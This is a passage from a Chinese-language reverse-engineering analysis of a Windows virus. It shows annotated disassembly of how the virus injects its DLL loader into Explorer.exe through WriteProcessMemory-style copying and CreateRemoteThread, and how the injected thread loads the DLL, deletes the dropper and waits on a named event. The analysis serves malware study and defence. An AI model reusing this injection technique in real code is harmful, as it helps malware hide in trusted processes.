
``` 
0040151B                 call    SearchSignInBuffer ; 搜索LoadLibrary函数的内层调用

0040151B

00401520                 mov     edi, ds:GetProcAddress

00401526                 add     esp, 10h

00401529                 test    eax, eax

0040152B                 jz      short loc_401534

0040152B

0040152D                 mov     ecx, [ebp+ProcessId] ; 进程ID/kernel32句柄

00401530                 add     eax, ecx

00401532                 jmp     short loc_40153E
```

### d) 如果没有搜索到 `InternalLoadLibrary`，则直接使用 `kernel32.dll` 导出的 `LoadLibraryA` 函数地址：

``` 
0040151B                 call    SearchSignInBuffer ; 搜索LoadLibrary函数的内层调用
00401520                 mov     edi, ds:GetProcAddress
00401526                 add     esp, 10h
00401529                 test    eax, eax
0040152B                 jz      short loc_401534
00401534                 push    offset ProcName ; "LoadLibraryA"
00401539                 push    [ebp+ProcessId] ; hModule
0040153C                 call    edi ; GetProcAddress
```

### e) 将相关函数地址和相关的字符串写入到前面在当前进程中分配的第一块内存中：

``` 
  typedef struct __RemoteData

  {

  DWORD LoadLibraryAAddr;

  DWORD DeleteFileAAddr;

  DWORD OpenEventAAddr;

  DWORD SleepAddr;

  DWORD CloseHandleAddr;

  DWORD FreeLibraryAddr;

  Char DllPathName[MAX_PATH]; %windir%\System32\upxdnd.dll(或随机名的dll名)

  Char LoaderPathName[MAX_PATH]:当前病毒实例的路径名

  +220: "51343281"

  ……

  } RemoteData;
```

``` 
0040153E                 push    offset s_Deletefilea ; "DeleteFileA"
00401543                 mov     [esi], eax      ; 写入LoadLibrary/内层调用函数的地址
00401545                 push    [ebp+ProcessId] ; hModule
00401548                 call    edi ; GetProcAddress
0040154A                 push    offset s_Openeventa ; "OpenEventA"
0040154F                 mov     [esi+4], eax
00401552                 push    [ebp+ProcessId] ; hModule
00401555                 call    edi ; GetProcAddress
00401557                 push    offset s_Sleep  ; "Sleep"
0040155C                 mov     [esi+8], eax
0040155F                 push    [ebp+ProcessId] ; hModule
00401562                 call    edi ; GetProcAddress
00401564                 push    offset s_Closehandle ; "CloseHandle"
00401569                 mov     [esi+0Ch], eax
0040156C                 push    [ebp+ProcessId] ; hModule
0040156F                 call    edi ; GetProcAddress
00401571                 push    offset s_Freelibrary ; "FreeLibrary"
00401576                 mov     [esi+10h], eax
00401579                 push    [ebp+ProcessId] ; hModule
0040157C                 call    edi ; GetProcAddress
0040157E                 mov     [esi+14h], eax  ; 以上保存了6个函数地址
00401581                 lea     eax, [esi+18h]
00401584                 test    eax, eax
00401586                 jz      short loc_401593

00401586

00401588                 push    [ebp+arg_0_LibName] ; char *
0040158B                 push    eax             ; char *
0040158C                 call    strcpy          ; 第7个写入LibPathName:X:\Windows\System32\upxdnd.dll
00401591                 pop     ecx
00401592                 pop     ecx

00401592

00401593

00401593 loc_401593:                             ; CODE XREF: InjectCodeToExplorerAndRun+139 j
00401593                 lea     eax, [esi+11Ch]
00401599                 test    eax, eax
0040159B                 jz      short loc_4015A8

0040159B

0040159D                 push    [ebp+arg_4_ModuleName] ; char *
004015A0                 push    eax             ; char *
004015A1                 call    strcpy

004015A1

004015A6                 pop     ecx
004015A7                 pop     ecx

004015A7

004015A8

004015A8 loc_4015A8:                             ; CODE XREF: InjectCodeToExplorerAndRun+14E j
004015A8                 lea     eax, [esi+220h]
004015AE                 push    offset Name     ; "51343281"
004015B3                 push    eax             ; char *
004015B4                 call    strcpy          ; 在当前进程分配的第一块内存中写入相关函数地址，及相关字符串。
```

### f) 下面将 `RemoteThreadProc` 函数代码拷贝到在当前病毒进程中分配的第二块内存中

``` 
004015B9                 mov     edi, offset InjectCodeToExplorerAndRun
004015BE                 mov     eax, offset RemoteThreadProc
004015C3                 sub     edi, eax
004015C5                 push    edi             ; dwSize
004015C6                 push    [ebp+var_C]     ; lpBuffer
004015C9                 push    eax             ; lpAddress
004015CA                 push    [ebp+hProcess]  ; hProcess
004015CD                 call    CopyMemory      ; 将函数RemoteThreadProc写入当前进程分配的第二块内存中
004015D2                 add     esp, 18h
004015D5                 test    eax, eax
004015D7                 jz      short loc_401623
```

### g) 将当前进程中两个内存块中的数据写到 `Explorer.exe` 进程中，第一块内存为相关函数地址，病毒DLL的路径名，病毒EXE的路径名，还有一个字符串，第二块内存保存为欲在 `Explorer.exe` 进程中执行的函数，然后创建远线程，注入到 `Explorer.exe` 进程，指向第一块内存的指针作为远线程处理函数的参数，因此在远线程处理函数中可以使用第一个内存块中那些相关数据。

``` 
004015D9                 push    230h            ; dwSize
004015DE                 push    esi             ; lpBuffer
004015DF                 push    [ebp+lpAddress] ; lpAddress
004015E2                 push    [ebp+hObject]   ; hProcess
004015E5                 call    WriteToProcess  ; 将当前进程第一块内存区数据拷贝到目标进程第一块内存中

004015E5

004015EA                 add     esp, 10h
004015ED                 test    eax, eax
004015EF                 jz      short loc_401623

004015EF

004015F1                 push    edi             ; dwSize
004015F2                 push    [ebp+var_C]     ; lpBuffer
004015F5                 push    [ebp+lpStartAddress] ; lpAddress
004015F8                 push    [ebp+hObject]   ; hProcess
004015FB                 call    WriteToProcess  ; 将当前进程第二块内存区中的函数写入目标进程第二块内存区中
00401600                 add     esp, 10h
00401603                 test    eax, eax
00401605                 jz      short loc_401623

00401605

00401607                 xor     eax, eax
00401609                 push    eax             ; lpThreadId
0040160A                 push    eax             ; dwCreationFlags
0040160B                 push    [ebp+lpAddress] ; lpParameter
0040160E                 push    [ebp+lpStartAddress] ; lpStartAddress
00401611                 push    400h            ; dwStackSize
00401616                 push    eax             ; lpThreadAttributes
00401617                 push    [ebp+hObject]   ; hProcess
0040161A                 call    ds:CreateRemoteThread ; 创建远线程到目标进程，线程函数和参数已经写入目标进程
00401620                 mov     [ebp+var_1C], eax
```

远线程创建完毕，释放内存，返回上层调用。

``` 
00401623                 push    ebx             ; dwSize
00401624                 push    esi             ; lpAddress
00401625                 push    [ebp+hProcess]  ; hProcess
00401628                 call    FreeMemory

00401628

0040162D                 push    ebx             ; dwSize
0040162E                 push    [ebp+var_C]     ; lpAddress
00401631                 push    [ebp+hProcess]  ; hProcess
00401634                 call    FreeMemory

00401634

00401639                 add     esp, 18h

00401639

0040163C                 push    [ebp+hObject]   ; hObject
0040163F                 call    ds:CloseHandle
00401645                 mov     eax, [ebp+var_1C]
00401648                 pop     edi
00401649                 pop     esi
0040164A                 pop     ebx
0040164B                 leave
0040164C                 retn
```

### h) 远线程处理函数分析

调用 `LoadLibraryA` 加载病毒DLL，然后，调用DLL映像基址+`0x30`所指向的地址处的函数。然后判断 `LoaderPathName` 是否为 `NULL`（从前面可以看到如果EXE为`%windir%\upxdnd.exe`，则其为 `NULL`），不为 `NULL`，则删除名称为 `LoaderPathName` 的文件，然后函数调用 `OpenEventA` 打开名为 `"51343281"` 的事件，除非有新的病毒实例启动创建这个事件，否则该函数在此处一直循环等待，当有新病毒实例运行后，线程函数退出循环，调用 `Dll+0x34` 处所指向的函数，然后释放DLL，退出远线程。

``` 
004013D9 RemoteThreadProc proc near              ;

004013D9

004013D9 var_4           = dword ptr -4

004013D9 arg_0           = dword ptr  8

004013D9

004013D9                 push    ebp
004013DA                 mov     ebp, esp
004013DC                 push    ecx
004013DD                 push    esi
```
